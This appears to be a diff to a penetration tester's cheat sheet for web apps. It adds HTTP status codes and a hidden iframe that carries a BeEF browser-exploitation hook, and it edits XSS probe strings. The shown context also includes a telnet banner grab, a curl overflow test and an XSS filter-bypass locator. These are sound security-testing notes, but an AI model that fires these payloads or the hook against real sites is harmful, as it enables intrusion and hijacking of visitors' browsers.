@@ -1,6 +1,31 @@
 Web Apps
 
 
+# Error Codes
+
+1xx Informational
+100 Continue
+
+2xx Success
+200 OK
+
+3xx Redirection
+301 Moved Permanently
+302 Found
+
+4xx Client Error
+401 Unauthorized
+403 Forbidden
+404 Not Found
+
+5xx Server Error
+500 Internal Server Error
+501 Not Implemented
+502 Bad Gateway
+503 Service Unavailable
+504 Gateway Timeout
+------------------------------------------------------------------------------------------------------
+
 # Apache version, eTag, HTTP Basic Authentication Enabled
 
 telnet <target IP> 80
@@ -105,7 +130,7 @@ curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
 <script>("Test_XSS")</script>
 
-<script>alert(123)</script>        Or try inserting a NULL byte:  %00<script>alert(123)</script> 
+<script>alert(1)</script>        Or try inserting a NULL byte:  %00<script>alert(1)</script> 
 
 http://target.com/index.php?user=<script>alert(123)</script>
 <script>('Test XSS')</script>
@@ -113,4 +138,7 @@ http://target.com/index.php?user=<script>alert(123)</script>
 curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
 This locator in particular is good. '';!--"<XSS>=&{()}
 I would probably change it. '';!--"<a2S>=&{()}
+
+<iframe height=”0″ width=”0″src=<BeEF_hook></iframe>
+
 
